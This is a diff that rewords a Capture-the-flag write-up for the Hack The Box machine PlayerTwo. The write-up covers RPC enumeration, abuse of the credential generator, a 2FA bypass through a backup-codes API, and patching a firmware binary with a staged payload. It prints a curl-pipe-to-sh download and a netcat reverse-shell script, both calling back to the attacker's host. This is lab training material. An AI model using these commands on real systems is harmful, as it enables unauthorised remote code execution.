@@ -6,18 +6,18 @@ points: 50
 rating: 4.4
 date: 2019-12-14
 avatar: assets/htb/playertwo.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/PlayerTwo
 ---
+
 ## Overview
 
-An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or medium boxes would.  Finding each pathway forward wasn't too difficult with proper enumeration, but getting past each step required patience and reading lots of documentation.  
+This Insane Linux box really stretched my web skills, and forced me to research unfamiliar protocols and services to a degree equal to three or four easier boxes combined.  Spotting the next route forward was straightforward enough with solid enumeration, but actually clearing each stage demanded patience and plenty of documentation reading.  
 
 ## Useful Skills and Tools
 
 #### Adding a hostname to the hosts file on Linux
 
-In order to get the intended page for a server, sometimes you may need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts` .   Subdomains need to be added on separate lines.
+To reach the page a server actually intends to serve, you sometimes have to send traffic to the site's FQDN instead of its IP.  To do that, point your machine at the domain by appending the line below to `/etc/hosts` .   Each subdomain goes on its own line.
 
 ```text
 <YOUR_IP>    <domain.name>
@@ -30,7 +30,7 @@ In order to get the intended page for a server, sometimes you may need to direct
 cewl -d 3 -o -a -e -w <output_file> <website_url>
 ```
 
-In order to get a comprehensive wordlist for a site, I use the following options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` to write the output to a file named `<file>`.
+To build a thorough wordlist for a site, I rely on these flags: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` to write the output to a file named `<file>`.
 
 #### Using `wfuzz` to brute force file names
 
@@ -38,11 +38,11 @@ In order to get a comprehensive wordlist for a site, I use the following options
 wfuzz -X GET -w <wordlist> --sc 200  -c http://player2.htb/proto/FUZZ.proto
 ```
 
-The options used here are: `-X GET` specifies the HTTP command to use, `-w <filename>` specifies which wordlist to use, `--sc 200` tells it to only list HTTP replies that return a code of 200, and `-c` makes the output easier to read with colors.  The command ends with the URL to enumerate, and will substitute any section in the URL where the word `FUZZ` is inserted with each word from the wordlist.
+Here's what each option does: `-X GET` sets the HTTP method, `-w <filename>` chooses the wordlist, `--sc 200` restricts the listing to replies with a 200 status code, and `-c` colorizes the output for readability.  The URL to enumerate comes at the end, and wherever the keyword `FUZZ` appears in that URL it gets swapped for each entry from the wordlist.
 
 #### Upgrading from a limited shell
 
-After getting a rough shell on the machine, my first order of business is usually moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use the arrow keys and `alt-` and `ctrl-` commands.
+Once I land a basic shell on a box, the first thing I normally do is upgrade to a nicer one that gives me conveniences like history, tab completion, and working arrow keys plus `alt-` and `ctrl-` shortcuts.
 
 1. Make sure python is installed with `which python`
 2. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
@@ -54,7 +54,7 @@ After getting a rough shell on the machine, my first order of business is usuall
 
 ### Nmap scan
 
-I started my enumeration off with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and`-oN <name>` saves the output with a filename of `<name>`.  
+My enumeration kicked off with an nmap scan against `<YOUR_IP>`. The flags I usually reach for are: `-p-`, a shortcut telling nmap to scan every TCP port, `-sC`, which equals `--script=default` and fires a batch of nmap enumeration scripts at the target, `-sV` for service detection, and `-oN <name>` to write the output to a file called `<name>`.  
 
 ```text
 kac0@kalimaa:~/htb/playertwo$ nmap -p- -sC -sV -O -oA playertwo.full <YOUR_IP>
@@ -147,21 +147,21 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 1482.37 seconds
 ```
 
-Despite all of that output, there were only three ports open; SSH and two that returned HTTP data.  The output from `TCP 8545` didn't look like HTML, rather it was reporting a Content-Type of `application/json`.  The message `"twirp_invalid_route"` looked like something to be investigated since nmap couldn't identify it.
+In spite of all that output, only three ports were actually open: SSH plus two serving HTTP.  The response on `TCP 8545` wasn't HTML; it advertised a Content-Type of `application/json`.  The `"twirp_invalid_route"` string stood out as worth digging into, especially since nmap couldn't fingerprint it.
 
 ### Enumerating `Port 80 - HTTP`
 
-Before jumping off into any potential rabbit holes with the strange output from port 8545, it was best to fire up a browser and first try to connect to the open port 80 at [http://<YOUR_IP>](http://<YOUR_IP>).  
+Rather than chase the odd port 8545 output and risk a rabbit hole, the smarter move was to open a browser and hit the open port 80 first at [http://<YOUR_IP>](http://<YOUR_IP>).  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-error.png)
+![](assets/wu/playertwo/img-1.png)
 
-Oops, well that didn't seem to work.  Refreshing the page just brought up this message again.  Looking closer at the output on the page...it says `Firefox can't load this page for some reason.` This is somewhat interesting, considering I was not using Firefox at the time, so I looked at the page source and discovered that it was actually a PNG image rather than text being displayed.  This wasn't an error message so much as the actual page content.  
+That clearly didn't go as planned, and reloading just produced the same message.  Reading it more carefully...it says `Firefox can't load this page for some reason.` Curious, since I wasn't even running Firefox at the time, so I checked the page source and realized the "message" was actually a PNG image, not real text.  It wasn't an error at all but the genuine page content.  
 
-Looking again at the text in the image, I noticed that it says "Please contact `MrR3boot@player2.htb`."  This looks like a potential username and hostname.  Perhaps redirecting my traffic to `http://player2.htb` would get me different output.  
+Reading the image text again, I spotted "Please contact `MrR3boot@player2.htb`."  That gave me a candidate username and a hostname.  Pointing my traffic at `http://player2.htb` might serve up something different.  
 
 #### Adding a hostname to the hosts file
 
-In order to get the intended page for a server, sometimes you need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts`
+To get the page a server actually means to serve, you sometimes have to direct traffic to the site's FQDN instead of its IP.  Achieve that by telling your machine where the domain lives, adding the line below to `/etc/hosts`
 
 ```text
 <YOUR_IP>    player2.htb 
@@ -169,42 +169,42 @@ In order to get the intended page for a server, sometimes you need to direct you
 
 ### Enumerating the real website
 
-After adding the domain to the hosts file, navigating to [http://player2.htb](http://player2.htb) led me to the real company website.  By the looks of it, this company has suffered some sort of network breach before and has upped their security standards since.
+With the domain in my hosts file, browsing to [http://player2.htb](http://player2.htb) brought up the actual company website.  Judging from the content, this company had been breached at some point and tightened up its security afterward.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-first-site.png)
+![](assets/wu/playertwo/img-2.png)
 
-After reading through the content on the page, I found a link to a subdomain at [http://product.player2.htb/](http://product.player2.htb/). Once again I added the new domain to my hosts file, and after navigating to this new site I found a login page.
+Reading through the page, I came across a link to a subdomain at [http://product.player2.htb/](http://product.player2.htb/). I added this new domain to my hosts file as well, and visiting it presented a login page.
 
 ```text
 <YOUR_IP>    player2.htb
 <YOUR_IP>    product.player2.htb
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-login-page.png)
+![](assets/wu/playertwo/img-3.png)
 
-I tried some basic credentials like `admin:admin` but only got an alert box back saying `Nope.` I figured that I must have to find the credentials somewhere else and decided to check out that other HTTP port I had seen earlier.
+A few obvious credentials like `admin:admin` just produced an alert box reading `Nope.` Clearly the creds had to come from somewhere else, so I turned my attention to that other HTTP port I'd noted earlier.
 
 ### Enumerating `Port 8545`
 
-Opening a browser page and navigating to [http://player2.htb:8545](http://player2.htb:8545) returned a JSON formatted error message. 
+Browsing to [http://player2.htb:8545](http://player2.htb:8545) gave back a JSON-formatted error message. 
 
 ```text
 { "code": "bad_route", "msg": "no handler for path \"/\"", "meta": { "twirp_invalid_route": "GET /" } }
 ```
 
-There was that `"twirp_invalid_route"` message I saw from nmap again.  I decided it was time to do a little research into `twirp` and see if I could find anything useful. 
+There was the `"twirp_invalid_route"` message from the nmap output once more.  Time to read up on `twirp` and see whether anything useful turned up. 
 
 ### Researching twirp
 
-I was quickly able to locate some resources on this protocol, which seems to be a routing method for accessing RPC methods securely.  The following links are the documentation that seemed to describe best how to interact with it.
+I quickly turned up resources on the protocol, which appears to be a way of routing requests to RPC methods securely.  The links below are the docs that best explained how to interact with it.
 
 [https://twitchtv.github.io/twirp/docs/intro.html](https://twitchtv.github.io/twirp/docs/intro.html)[https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md)
 
-The protocol uses a `.proto` file to determine the correct routing for RPC method requests, so I needed to see if I could find that file.  There didn't seem to be a `/rpc` directory as specified in the documentation, so I decided to enumerate folders using `Dirbuster` to see if they had done a non-standard install.  After a while, I found a `/proto` directory at [http://player2.htb/proto/](http://player2.htb/proto/).  
+Because the protocol relies on a `.proto` file to work out the routing for RPC requests, I needed to locate that file.  The `/rpc` directory mentioned in the docs didn't appear to exist, so I ran `Dirbuster` to enumerate directories in case the install was non-standard.  Eventually I found a `/proto` directory at [http://player2.htb/proto/](http://player2.htb/proto/).  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-dirbuster_player2.htb.png)
+![](assets/wu/playertwo/img-4.png)
 
-I thought that the `/proto` directory seemed like a likely location to place a `.proto` file, but I still didn't know what the name of the file was to access it.  Next, I ran `cewl` against the two websites I had found in order to create a wordlist of likely filenames, but this did not lead anywhere.  It ended up being a standard Dirbuster wordlist that got me the filename.
+The `/proto` directory felt like an obvious home for a `.proto` file, but I still didn't know the filename to request.  So I ran `cewl` against the two sites I'd found to build a wordlist of plausible filenames, but that went nowhere.  In the end it was a stock Dirbuster wordlist that revealed the filename.
 
 #### Using `cewl` to get a customized wordlist
 
@@ -212,11 +212,11 @@ I thought that the `/proto` directory seemed like a likely location to place a `
 cewl -d 3 -o -a -e -w player2.cewl http://player2.htb
 ```
 
-In order to get a comprehensive wordlist for this site, I used the following options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` writes the output to a file named `<file>`.
+To build a thorough wordlist for this site, I used these options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` writes the output to a file named `<file>`.
 
 #### Using `wfuzz` to brute force file names
 
-Using the wordlist from `cewl` first, then later with the standard Dirbuster wordlist, I used the `wfuzz` tool to use fuzzing to try to find out the filename.  Since I was pretty sure the file was in the `/proto` folder, and the filetype was `.proto`, I was able to do some fuzzing against the filename in-between with the format `/proto/FUZZ.proto` .  
+Starting with the `cewl` wordlist and later switching to the standard Dirbuster one, I used `wfuzz` to fuzz for the filename.  Confident the file lived in `/proto` and ended in `.proto`, I could fuzz the middle portion of the name using the pattern `/proto/FUZZ.proto` .  
 
 ```text
 kac0@kalimaa:~/htb/playertwo$ wfuzz -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --sc 200  -c http://player2.htb/proto/FUZZ.proto
@@ -237,11 +237,11 @@ ID           Response   Lines    Word     Chars       Payload
 000034176:   200        18 L     46 W     266 Ch      "generated"
 ```
 
-After only... a few thousand tries, I got a successful hit using the word `generated`.  The `.proto` file could then be downloaded using the URL [http://player2.htb/proto/generated.proto](http://player2.htb/proto/generated.proto).
+After only... a few thousand attempts, I landed a hit on the word `generated`.  The `.proto` file could now be grabbed from [http://player2.htb/proto/generated.proto](http://player2.htb/proto/generated.proto).
 
 ### The `.proto` file
 
-The contents of the `generated.proto` file had some very useful information.
+The `generated.proto` file held some genuinely useful information.
 
 ```text
 syntax = "proto3";
@@ -264,11 +264,11 @@ message Creds {
 }
 ```
 
-The `GenCreds` RPC method in particular sounded like exactly what I was looking for.  Now I needed to figure out how to access this method and see what it could give me.
+The `GenCreds` RPC method in particular sounded like precisely what I needed.  Now I had to work out how to reach that method and learn what it would hand back.
 
 ### Using `twirp` to access RPC methods
 
-The documentation at [https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md) gave the following example using `curl`:
+The docs at [https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md) provided this `curl` example:
 
 ```text
 curl --request "POST" \
@@ -286,19 +286,19 @@ Further reading at [https://twitchtv.github.io/twirp/docs/spec\_v5.html](https:/
 
 > Twirp always uses HTTP POST method to send requests, because it closely matches the semantics of RPC methods.
 
-Since this protocol is able to use standard HTTP requests, I decided to use `Burp Repeater` instead of `curl` so that I could more easily modify and resend requests as I tested them.  
+Since the protocol works over ordinary HTTP requests, I opted for `Burp Repeater` rather than `curl`, which made tweaking and resending requests during testing much easier.  
 
-In order to connect to any potential exposed RPC methods through this port, a POST to the RPC method using the format below is required.
+To talk to any RPC methods that might be exposed on this port, you have to POST to the method using the format below.
 
 ```text
 POST /twirp/<package>.<Service>/<Method>
 ```
 
-From the information in the `generated/proto` file I was able to determine that the Package name was `twirp.player2.auth` and the Service was `Auth`.  The method we were trying to access was `GenCreds`.  This made our full Twirp route `/twirp/twirp.player2.auth.Auth/GenCreds`. 
+The `generated/proto` file told me the Package name was `twirp.player2.auth` and the Service was `Auth`.  The method I wanted was `GenCreds`.  That made the full Twirp route `/twirp/twirp.player2.auth.Auth/GenCreds`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/failed-to-parse-request-json.png)
+![](assets/wu/playertwo/img-5.png)
 
-After further testing and reading through the documentation I realized that you had to send some sort of JSON formatted data in the request as well as the proper headers.  
+More testing and documentation reading made it clear that the request needed some JSON-formatted data along with the correct headers.  
 
 _Make sure to send the `Content-Type:application/json` header as well! Otherwise you will get errors._ 
 
@@ -311,7 +311,7 @@ Content-Length: 27
 {"message":"Hello, World!"}
 ```
 
-After fixing my request and sending it to the server I got the following reply:
+Once I corrected the request and sent it off, the server replied with:
 
 ```text
 HTTP/1.1 200 OK
@@ -328,17 +328,17 @@ Content-Type: application/json
 
 ### Logging into `product.player2.htb`
 
-Finally!  I had some credentials.  I tried to use these creds to log into the site at  [http://product.player2.htb/](http://product.player2.htb/) and got this message:
+At last, I had credentials.  I tried them against the login at  [http://product.player2.htb/](http://product.player2.htb/) and was met with this message:
 
-![Nope.](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-nope.png)
+![Nope.](assets/wu/playertwo/img-6.png)
 
-Since I had taken a short break after successfully crafting my request and taking notes an all, I figured that maybe the credentials it had supplied me were only good for a limited time since they appeared to be randomly generated.  I sent the request through Burp once more to see if it would give a different answer and I got a different set of credentials.  I immediately went to the login site and entered them.
+Having stepped away for a bit after crafting the request and writing notes, I suspected the credentials might be time-limited since they looked randomly generated.  I replayed the request through Burp to see if the answer changed, and indeed got a fresh set of credentials.  I rushed back to the login page and entered them.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-new-creds.png)
+![](assets/wu/playertwo/img-7.png)
 
-![Nope.](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-nope.png)
+![Nope.](assets/wu/playertwo/img-6.png)
 
-After playing around with generating credentials, and looking for other ways to login \(SSH did not work, either\) I noticed a pattern in the way the method was giving me credential sets.  It turns out, there were only four possible usernames and four possible passwords.  _I also found out that it didn't seem to matter what data I send to the RPC method, even a blank message worked._  
+After generating credentials repeatedly and hunting for other login routes \(SSH didn't work either\), I picked up on a pattern in the credential sets the method handed out.  As it turned out, there were only four possible usernames and four possible passwords.  _I also discovered the data I sent to the RPC method didn't actually matter, even an empty message worked._  
 
 Usernames:
 
@@ -354,39 +354,39 @@ Passwords:
 * XHq7_WJTA?QD_?E2
 * Lp-+Q8umLW5\*7qkc
 
-Refusing to give up I tried each combination the server gave me. Nope. a number of times...and then...
+Determined not to quit, I worked through each combination the server offered. Nope. several times over...and then...
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-2fa.png)
+![](assets/wu/playertwo/img-8.png)
 
-I was finally successfully authenticated and redirected to [http://product.player2.htb/totp](http://product.player2.htb/totp).  2FA!  Now I needed to try and figure out how to bypass this two-factor authentication page by somehow getting a Time-based One-Time Password \(TOTP\).  
+I finally authenticated and got redirected to [http://product.player2.htb/totp](http://product.player2.htb/totp).  2FA!  Now the challenge was figuring out how to get past this two-factor page, presumably by obtaining a Time-based One-Time Password \(TOTP\).  
 
-_Actually, I kind of lied earlier...the first set of credentials it gave me logged me right in and brought me to this page, but it seemed more dramatic this way, especially since I had been so lucky getting the right ones the first time.  The creds it gave me didn't work again shortly after probably because of some internal site error or maybe I fat-fingered pasting it in again.  Shortly after, someone reset the box and I then had to go through the rest of that to get back in. The original creds I got seemed to work every time while doing this writeup.  Doh!_  
+_Okay, I fibbed a little earlier...the very first set of credentials logged me straight in and landed me on this page, but it read more dramatically the other way, especially given how lucky I'd been to hit the right ones immediately.  Those creds stopped working soon after, probably due to an internal site glitch or maybe I fumbled the paste.  Then someone reset the box and I had to repeat all of that to get back in. The original creds worked every single time while writing this up.  Doh!_  
 
 ### Bypassing Time-based One-Time Password \(TOTP\) 2FA
 
-After my `Dirbuster` scan of the first website earlier had finished, I had also run it against the `product` page as well which led me to discover the `/api` folder.  
+Once my earlier `Dirbuster` scan of the first site finished, I had also pointed it at the `product` page, which uncovered the `/api` folder.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-dirbuster.png)
+![](assets/wu/playertwo/img-9.png)
 
- I got lucky after that by guessing that there was a TOTP API since the page mentioned backup codes.  This led me to the page [http://product.player2.htb/api/totp](http://product.player2.htb/api/totp).  Navigating to the `/api/totp` page gave me a useful error: 
+ From there I got lucky guessing there'd be a TOTP API, since the page referenced backup codes.  That brought me to [http://product.player2.htb/api/totp](http://product.player2.htb/api/totp).  Hitting `/api/totp` returned a helpful error: 
 
 ```text
 {"error":"Cannot GET \/"}
 ```
 
-This looked to be another JSON formatted reply, so I decided to research how to bypass JSON based 2FA.  This led me to [https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html](https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html).  The author described the message he sent to the server as below, though I didn't have all that information. 
+This was another JSON-formatted reply, so I went looking for ways to bypass JSON-based 2FA.  That search led me to [https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html](https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html).  The author's request to the server looked like the following, though I didn't have all of that data. 
 
 > `{"action":"backup_codes","clusterNum":"000","accountId":"test123","email":"test123@gmail.com"}`
 
-![&quot;invalid\_session&quot;](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-invalid-session.png)
+![&quot;invalid\_session&quot;](assets/wu/playertwo/img-10.png)
 
-I tried sending a blank test message using Burp like before, but this gave me an "invalid session" error message, so I determined I probably needed to send the PHPSESSID I saw in my cookies after I logged into the site.  Sending the session ID in a header kept giving me the same error until I realized my mistake. **Need to send the session ID in a** _**COOKIE!!!**_ **** After that, the error message became "invalid action".  
+I sent a blank test message through Burp as before, but got an "invalid session" error, which suggested I needed to include the PHPSESSID I'd seen in my cookies after logging in.  Sending the session ID in a header kept returning the same error until the penny dropped. **Need to send the session ID in a** _**COOKIE!!!**_ **** Once I did, the error changed to "invalid action".  
 
 On the 2FA site I saw:
 
 > 2FA You can either use the OTP that we sent to your mobile or the `backup codes` that you have with you.
 
-Emphasis above is mine.  Since I had already noticed on the `/totp` site that I was looking for "backup codes", and the blog above had `{"action":"backup_codes",` in his request, this looked like what I needed.    
+The emphasis above is mine.  Since the `/totp` page had already hinted at "backup codes" and the blog post used `{"action":"backup_codes",` in its request, this seemed like exactly the right action.    
 
 ```text
 POST /api/totp HTTP/1.1
@@ -400,7 +400,7 @@ Cookie: PHPSESSID=7987tggfl6k22pq872k2vhqcej
 }
 ```
 
-Once I got my request formatted correctly ,and had the proper Cookie header, I got a response from the server.
+With the request formatted correctly and the right Cookie header in place, the server responded.
 
 ```text
 HTTP/1.1 200 OK
@@ -415,50 +415,50 @@ Content-Type: application/json
 {"user":"snowscan","code":"84573484857384"}
 ```
 
-I had my 2FA code!  I used this code on the `/totp` page and was greeted with the page at [http://product.player2.htb/protobs/](http://product.player2.htb/protobs/).  
+I had my 2FA code!  Entering it on the `/totp` page brought me to [http://product.player2.htb/protobs/](http://product.player2.htb/protobs/).  
 
 ### The internal protobs page
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-protobs-after2fa.png)
+![](assets/wu/playertwo/img-11.png)
 
-Since it was the name of the product, my first instinct was to test and see if there was a page at http://product.player2.htb/protobs.  
+Since "protobs" was the product name, my first instinct was to check whether a page existed at http://product.player2.htb/protobs.  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-protobs-uploader.png)
+![](assets/wu/playertwo/img-12.png)
 
-Yep.  Lucky guess again.  It seemed that I can upload files to go through some sort of verification, which redirected to the page [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  I tried uploading a PHP reverse shell, but it just led to a blank white page and did not send me a shell.  After experimenting with various file uploads and testing for command injection and other things I moved on to explore the rest of the `/home` page.
+Yep.  Another lucky guess.  It appeared I could upload files for some kind of verification, which redirected to [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  Uploading a PHP reverse shell just produced a blank white page with no callback.  After trying various file uploads and testing for command injection and similar tricks, I moved on to explore the rest of the `/home` page.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-protobs-pdf_link.jpg)
+![](assets/wu/playertwo/img-13.jpg)
 
-After searching around the site for awhile, I found a very hard to see link under the heading "Get an early access to Protobs".  The background was animated and the explosion kept obscuring the text.  In the screenshot above I have my mouse hovering over the link \(see the URL in the bottom left corner\).  Clicking on this link gave me a pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  
+After poking around the site for a while, I found a barely-visible link under the heading "Get an early access to Protobs".  The animated background and recurring explosion kept hiding the text.  In the screenshot above my cursor is over the link \(note the URL in the bottom-left corner\).  Clicking it served a PDF at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-protobs-pdf.png)
+![](assets/wu/playertwo/img-14.png)
 
-This document describes the firmware verification process, which is likely what is happening at the `/verify` page I found earlier.
+The document lays out the firmware verification process, which is presumably what's running behind the `/verify` page I'd found earlier.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18-protobs-pdf2.png)
+![](assets/wu/playertwo/img-15.png)
 
- The last page in the PDF confirms this.  It looks like Protobs developers can use the `/protobs/verify` page to test out their firmware before pushing it to customers.  I downloaded the firmware file, and unzipped it.  Inside was an `info` file with copyright information, a `version` file with versioning information, and the `protobs.bin` firmware file.  
+ The PDF's final page confirms it.  It seems Protobs developers use the `/protobs/verify` page to validate their firmware before shipping it to customers.  I downloaded the firmware archive and extracted it.  Inside were an `info` file with copyright details, a `version` file with version information, and the `protobs.bin` firmware itself.  
 
 ### Protobs.bin
 
-Running the `file` command against the `Protobs.bin` file shows that it is just data.
+Running `file` against `Protobs.bin` reports it as plain data.
 
 ```text
 kac0@kalimaa:~/htb/playertwo$ file Protobs.bin 
 Protobs.bin: data
 ```
 
-However, opening the file in GHex, I can see an ELF header, meaning this is a Linux executable with some data stuffed at the beginning \(most likely the verification signature\).  
+Opening it in GHex, though, reveals an ELF header, so it's really a Linux executable with some bytes prepended \(most likely the verification signature\).  
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-protobs-ghex.png)
+![](assets/wu/playertwo/img-16.png)
 
-While browsing through the file, I saw a string in the ELF that looks suspiciously like a shell command: `stty raw -echo min 0 time 10`. Since this command was placed in the program as a plain string, perhaps I could replace it with my own command and could possibly get code execution on the remote server. 
+Scrolling through the file, I noticed a string in the ELF that looked a lot like a shell command: `stty raw -echo min 0 time 10`. Because the command sat in the binary as a plain string, I figured I might swap in my own command and potentially gain code execution on the remote server. 
 
 ### Researching how to replace a section of code inside an ELF executable
 
-I did some research into how to replace a section of code in the ELF, and came up with [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file).  This in turn led to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  Using strings to determine the byte offset of the code to replace, then using `dd` it is possible to replace arbitrary code.  However, it seemed to me as if all they were doing was some fancy cut and paste.  
+I researched how to swap out a section of code in the ELF and found [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file), which in turn pointed me to [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  By using strings to find the byte offset of the code and then `dd`, you can overwrite arbitrary code.  To me, though, that amounted to fancy cut-and-paste.  
 
-I knew from previous experience from doing CTFs that you could modify the hex code of a file \(and by extension the ASCII strings they represent\) almost as easily as using a regular text editor.  I decided to try "cheating" a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place.  I kept it as simple as possible since I didn't know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer.  My code read:`curl 10.10.15.20:8090/a | sh` .  This would download my script called simply `a` and then execute it using `sh`.  _I would have used bash, but nearly every Linux box is guaranteed to have `sh` or at least something aliased to it, and this also saved me a couple characters!_  
+From past CTF experience I knew you could edit a file's hex \(and therefore the ASCII strings it contains\) almost as easily as in a normal text editor.  So I decided to "cheat" a little with GHex. I highlighted the string I wanted to change and typed my own commands over it.  Not knowing what the verification checked, I kept it as minimal as possible and went with a staged payload. The plan was for the program to fetch a script hosted on my local python SimpleHTTPServer.  My code was:`curl 10.10.15.20:8090/a | sh` .  This pulls down my script, simply named `a`, and runs it with `sh`.  _I'd have used bash, but practically every Linux box has `sh` or something aliased to it, and this saved me a couple of characters too!_  
 
 ```text
 #!/bin/sh
@@ -470,7 +470,7 @@ chmod +x /dev/shm/nc
 /dev/shm/nc 10.10.15.20 12345 -e /bin/sh 
 ```
 
-Once my script executed, it would then reach back and download netcat \(in case the version on the machine did not have `-e` capability\).  After that it made `nc` executable and created a reverse shell back to my computer which was waiting to catch it.  
+When the script ran, it would reach back and grab netcat \(in case the machine's version lacked `-e` support\).  It then made `nc` executable and fired a reverse shell back to my waiting listener.  
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-got-shell%2520%25281%2529.png)
 
@@ -478,7 +478,7 @@ Once my script executed, it would then reach back and download netcat \(in case 
 
 ### Upgrading to a usable shell
 
-After getting a rough shell on the machine, my first order of business was moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use non-character keys \(such as the arrow keys\).
+With a basic shell on the box, my first task was upgrading to a nicer one offering conveniences like history, tab completion, and working non-character keys \(such as the arrow keys\).
 
 ```text
 which python
@@ -490,7 +490,7 @@ kac0@kalimaa:~/htb/playertwo$ stty raw -echo;
 kac0@kalimaa:~/htb/playertwo$ fg
 ```
 
-First I made sure that python was installed, then upgraded from a limited shell to a more useful one in just a few steps:
+First I confirmed python was present, then upgraded from the limited shell to a more capable one in a handful of steps:
 
 1. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
 2. Background the shell and return to my machine with ```ctrl-z```
@@ -516,7 +516,7 @@ drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
 -rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
 ```
 
-Next I checked for any password-less sudo permissions with `sudo -l` but there weren't any.  A quick check of the directory I was in showed the back-side code for the website.  
+Next I ran `sudo -l` to check for any passwordless sudo rights, but found none.  A quick look at my current directory revealed the website's backend code.  
 
 ```text
 www-data@player2:/home$ cat /etc/passwd
@@ -556,7 +556,7 @@ mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
 egre55:x:1001:1001::/home/egre55:/bin/sh
 ```
 
-A look inside `/etc/passwd` shows three users that can log in: `root`, `egre55`, and `observer` .
+Inspecting `/etc/passwd` shows three login-capable users: `root`, `egre55`, and `observer` .
 
 ```text
 www-data@player2:/home$ ls -la
@@ -566,7 +566,7 @@ drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
 drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
 ```
 
-However, the user `egre55` user home folder wasn't visible to me, even though it is specified in `/etc/passwd`.  Looks like `observer` is the most likely avenue for privilege escalation.  
+However, `egre55`'s home folder wasn't visible to me even though it's listed in `/etc/passwd`.  That made `observer` the most promising target for privilege escalation.  
 
 ```text
 mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
@@ -581,7 +581,7 @@ egre55     1544  0.0  0.0   4624   832 ?        S    Jun24   0:00 /bin/dash -p -
 egre55     1545  0.0  1.1 275764 21384 ?        S    Jun24   0:00 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
 ```
 
-Some of the interesting processes that were running are shown above.  Netstat showed two additional ports listening on 127.0.0.1, `port 1883 -> MQQT` and `port 3306 -> MySQL.`After poking around for a bit and not finding anything useful, I decided to start with mosquitto since I hadn't heard of it.  
+Some of the more interesting running processes are shown above.  Netstat revealed two extra ports bound to 127.0.0.1, `port 1883 -> MQQT` and `port 3306 -> MySQL.`After poking around a bit without finding anything useful, I started with mosquitto since it was new to me.  
 
 ```text
